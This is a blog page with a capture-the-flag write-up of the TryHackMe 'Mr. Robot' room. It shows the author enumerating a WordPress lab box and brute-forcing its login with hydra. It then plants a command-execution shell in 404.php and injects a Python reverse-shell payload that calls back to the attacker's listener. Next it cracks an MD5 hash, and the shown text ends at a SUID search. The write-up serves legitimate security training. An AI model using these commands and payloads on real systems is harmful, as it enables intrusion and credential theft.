@@ -1,0 +1,307 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Mr. Robot | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Mr. Robot from TryHackMe."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/24_mrrobot/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Mr. Robot</h1> <p class="post-description">Mr. Robot from TryHackMe.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/mrrobot/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="THM Mr. Robot Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://tryhackme.com/room/mrrobot" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Here we go taking on Mr. Robot. Hope you enjoy the ride.</p> <p>The nmaps didn’t seem to work on this one. So, we will skip it and get on with exploritizing. Run curl -I to get the headers to try and fingerprint the technology.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>curl <span class="nt">-I</span> http://10.10.11.55 
+HTTP/1.1 200 OK
+Date: Sun, 09 Feb 2025 03:35:38 GMT
+Server: Apache
+X-Frame-Options: SAMEORIGIN
+Accept-Ranges: bytes
+Vary: Accept-Encoding
+X-Mod-Pagespeed: 1.9.32.3-4523
+Cache-Control: max-age<span class="o">=</span>0, no-cache
+Content-Length: 1188
+Content-Type: text/html
+</code></pre></div></div> <p><br> And curl -I against port 443 just to ensure that it is the same.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>curl <span class="nt">-I</span> https://10.10.11.55 <span class="nt">-k</span>
+HTTP/1.1 200 OK
+Date: Sun, 09 Feb 2025 03:36:10 GMT
+Server: Apache
+X-Frame-Options: SAMEORIGIN
+Accept-Ranges: bytes
+Vary: Accept-Encoding
+X-Mod-Pagespeed: 1.9.32.3-4523
+Cache-Control: max-age<span class="o">=</span>0, no-cache
+Content-Length: 1077
+Content-Type: text/html
+</code></pre></div></div> <p><br> Run ffuf against the port 80 website to try to find any interesting directories or files.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.11.55/FUZZ <span class="nt">-e</span> .txt,.bak,.html,.php <span class="nt">-fw</span> 189
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.55/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Extensions       : .txt .bak .html .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 189
+________________________________________________
+
+.html                   [Status: 403, Size: 214, Words: 16, Lines: 10, Duration: 275ms]
+images                  [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 275ms]
+index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 370ms]
+blog                    [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 299ms]
+rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 691ms]
+sitemap                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 304ms]
+login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 678ms]
+0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 721ms]
+feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 673ms]
+video                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 265ms]
+image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 728ms]
+atom                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 666ms]
+wp-content              [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 260ms]
+admin                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 263ms]
+audio                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 267ms]
+intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 263ms]
+wp-login                [Status: 200, Size: 2657, Words: 115, Lines: 53, Duration: 666ms]
+wp-login.php            [Status: 200, Size: 2657, Words: 115, Lines: 53, Duration: 654ms]
+css                     [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 262ms]
+rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 636ms]
+license                 [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 264ms]
+license.txt             [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 265ms]
+wp-includes             [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 378ms]
+js                      [Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 308ms]
+wp-register.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3192ms]
+Image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3041ms]
+wp-rss2.php             [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2958ms]
+rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2883ms]
+page1                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3056ms]
+readme                  [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 389ms]
+readme.html             [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 316ms]
+robots.txt              [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 316ms]
+robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 318ms]
+dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2879ms]
+%20                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3280ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+</span></code></pre></div></div> <p><br> Check the wp-login.php page to give it a look.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/mrrobot/wp-login.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Login Page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Run wpscan to enumerate the users.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://10.10.11.55 <span class="nt">--enumerate</span> u  
+_______________________________________________________________
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.11.55/ [10.10.11.55]
+[+] Started: Sun Feb  9 14:42:48 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.10.11.55/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.11.55/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] The external WP-Cron seems to be enabled: http://10.10.11.55/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.11.55/a386c7c.html, Match: '</span>wp-includes<span class="se">\/</span>js<span class="se">\/</span>wp-emoji-release.min.js?ver<span class="o">=</span>4.3.1<span class="s1">'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.11.55/a386c7c.html, Match: '</span>WordPress 4.3.1<span class="s1">'
+
+[+] WordPress theme in use: twentyfifteen
+ | Location: http://10.10.11.55/wp-content/themes/twentyfifteen/
+ | Last Updated: 2024-11-12T00:00:00.000Z
+ | Readme: http://10.10.11.55/wp-content/themes/twentyfifteen/readme.txt
+ | [!] The version is out of date, the latest version is 3.9
+ | Style URL: http://10.10.11.55/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
+ | Style Name: Twenty Fifteen
+ | Style URI: https://wordpress.org/themes/twentyfifteen/
+ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen'</span>s simple, st...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In 404 Page <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |
+ | Version: 1.3 <span class="o">(</span>80% confidence<span class="o">)</span>
+ | Found By: Style <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |  - http://10.10.11.55/wp-content/themes/twentyfifteen/style.css?ver<span class="o">=</span>4.3.1, Match: <span class="s1">'Version: 1.3'</span>
+
+<span class="o">[</span>+] Enumerating Users <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+ Brute Forcing Author IDs - Time: 00:00:05 &lt;<span class="o">==============================================================================================================================================================&gt;</span> <span class="o">(</span>10 / 10<span class="o">)</span> 100.00% Time: 00:00:05
+
+<span class="o">[</span>i] No Users Found.
+
+<span class="o">[!]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+<span class="o">[!]</span> You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+<span class="o">[</span>+] Finished: Sun Feb  9 14:44:38 2025
+<span class="o">[</span>+] Requests Done: 62
+<span class="o">[</span>+] Cached Requests: 6
+<span class="o">[</span>+] Data Sent: 15.066 KB
+<span class="o">[</span>+] Data Received: 279.021 KB
+<span class="o">[</span>+] Memory used: 240.48 MB
+<span class="o">[</span>+] Elapsed <span class="nb">time</span>: 00:01:50
+</code></pre></div></div> <p><br> Check the robots.txt file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-agent: <span class="k">*</span>
+fsocity.dic
+key-1-of-3.txt
+</code></pre></div></div> <p><br> Download the two files that are indicated in the file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>curl http://10.10.11.55/key-1-of-3.txt <span class="nt">-o</span> key-1-of-3.txt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    33  100    33    0     0     34      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--    34
+
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>curl http://10.10.11.55/fsocity.dic <span class="nt">-o</span> fsocity.dic
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 7075k  100 7075k    0     0   557k      0  0:00:12  0:00:12 <span class="nt">--</span>:--:-- 1255k
+</code></pre></div></div> <p><br> Get the first flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>curl http://10.10.11.55/key-1-of-3.txt         
+&lt;redacted&gt;
+</code></pre></div></div> <p><br> Get the login request in the Network tab of the devloper’s tools. We can note the data parameters that we can send. We can also not the phrase to check to determine if we have a valid username.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/mrrobot/loginrequest.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Request" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use the hydra program and the fsociety.dic dictionary to try and brute-force the username.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>hydra <span class="nt">-L</span> fsocity.dic <span class="nt">-p</span> admin 10.10.11.55 http-post-form <span class="s2">"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&amp;testcookie=1:Invalid Username"</span>
+Hydra v9.5 <span class="o">(</span>c<span class="o">)</span> 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>
+
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2025-02-09 14:59:33
+<span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries <span class="o">(</span>l:858235/p:1<span class="o">)</span>, ~53640 tries per task
+<span class="o">[</span>DATA] attacking http-post-form://10.10.11.55:80/wp-login.php:log<span class="o">=</span>^USER^&amp;pwd<span class="o">=</span>^PASS^&amp;wp-submit<span class="o">=</span>Log+In&amp;redirect_to<span class="o">=</span>http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&amp;testcookie<span class="o">=</span>1:Invalid Username
+<span class="o">[</span>80][http-post-form] host: 10.10.11.55   login: Elliot   password: admin
+<span class="o">[</span>STATUS] 112.00 tries/min, 112 tries <span class="k">in </span>00:01h, 858123 to <span class="k">do in </span>127:42h, 16 active
+^CThe session file ./hydra.restore was written. Type <span class="s2">"hydra -R"</span> to resume session.
+</code></pre></div></div> <p><br> View the request with the valid username to get an updated failure phrase.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/mrrobot/invalidpw.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Invalid Password" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Run hydra again to search for the password so we can have a valid login set.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>hydra <span class="nt">-l</span> Elliot <span class="nt">-P</span> fsocity.dic 10.10.145.112 http-post-form <span class="s2">"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&amp;testcookie=1:The password you entered"</span>
+Hydra v9.5 <span class="o">(</span>c<span class="o">)</span> 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>
+
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2025-02-09 18:01:59
+<span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries <span class="o">(</span>l:1/p:858235<span class="o">)</span>, ~53640 tries per task
+<span class="o">[</span>DATA] attacking http-post-form://10.10.145.112:80/wp-login.php:log<span class="o">=</span>^USER^&amp;pwd<span class="o">=</span>^PASS^&amp;wp-submit<span class="o">=</span>Log+In&amp;redirect_to<span class="o">=</span>http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&amp;testcookie<span class="o">=</span>1:The password you entered
+<span class="o">[</span>80][http-post-form] host: 10.10.145.112   login: Elliot   password: ER28-0652
+1 of 1 target successfully completed, 1 valid password found
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2025-02-09 18:02:20
+</code></pre></div></div> <p><br> Test the credentials and login into the wordpress instance.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/mrrobot/testcred.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Login" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Go to the theme editor.</p> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/mrrobot/themeed.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Theme Editor" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Edit the 404.php file and a command line to accept a get parameter and execute it.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/mrrobot/404.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Edit the 404.php" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Navigate to the 404.php file and give it ls to test the command execution.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/mrrobot/lstest.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Test ls" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Start a listener that listens on port 4444.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 4444 
+listening on <span class="o">[</span>any] 4444 ...
+</code></pre></div></div> <p><br> Use revshells to get a python one-liner exploit.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/mrrobot/revshells.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Revshells" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Inject the Revshells payload into the cmd parameter. Restart the victim machine if you ever run out of time.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.145.112/wp-content/themes/twentyfifteen/404.php?cmd<span class="o">=</span>python3%20-c%20%27import%20socket,subprocess,os<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span>%2210.4.119.29%22,4444<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span>%20os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span>import%20pty<span class="p">;</span>%20pty.spawn<span class="o">(</span>%22sh%22<span class="o">)</span>%27
+</code></pre></div></div> <p><br> Check the listener and catch the shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 4444 
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.4.119.29] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.145.112] 60036
+<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span>
+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span>
+&lt;/wordpress/htdocs/wp-content/themes/twentyfifteen<span class="err">$</span>
+</code></pre></div></div> <p><br> Check the password.raw-md5 file to get the password hash.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daemon@linux:/home/robot<span class="nv">$ </span><span class="nb">cat </span>password.raw-md5
+<span class="nb">cat </span>password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+</code></pre></div></div> <p><br> Use john the ripper to crack the password hash.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/thm/mrrobot]
+└─<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/home/kali/Documents/htb/metatwo/hashkiller24.txt <span class="nt">--format</span><span class="o">=</span>raw-md5 password.raw-md5
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
+Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>4
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+abcdefghijklmnopqrstuvwxyz <span class="o">(</span>robot<span class="o">)</span>     
+1g 0:00:00:05 DONE <span class="o">(</span>2025-02-09 16:00<span class="o">)</span> 0.1721g/s 11515Kp/s 11515Kc/s 11515KC/s abcdefghijklmnop123secret..ABCDEFGHILMNOPQRSTUVZ
+Use the <span class="s2">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div> <p><br> Use the new password to switch user into the robot user.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;/wordpress/htdocs/wp-content/themes/twentyfifteen<span class="nv">$ </span>su robot 
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+</code></pre></div></div> <p><br> Snag that second flag. See that. It rhymed.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robot@linux:~<span class="nv">$ </span><span class="nb">cat </span>key-2-of-3.txt
+<span class="nb">cat </span>key-2-of-3.txt
+&lt;redacted&gt;
+robot@linux:~<span class="nv">$ </span>ip a 
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default 
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
+    <span class="nb">link</span>/ether 02:56:d1:80:13:d1 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.45.171/16 brd 10.10.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::56:d1ff:fe80:13d1/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> <p><br> Try sudo -l to see what we can run as sudo. Nothing.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robot@linux:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>robot: abcdefghijklmnopqrstuvwxyz
+
+Sorry, user robot may not run <span class="nb">sudo </span>on linux.
+</code></pre></div></div> <p><br> Check the g0tmi1k Linux privilege escalation blog.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/mrrobot/gotmilk.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="G0tmi1k" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" rel="external nofollow noopener" target="_blank">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p> <p><br> Run the command to get a list of the SUID stick bit programs. Hey, nmap! Easy.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robot@linux:/dev/shm<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
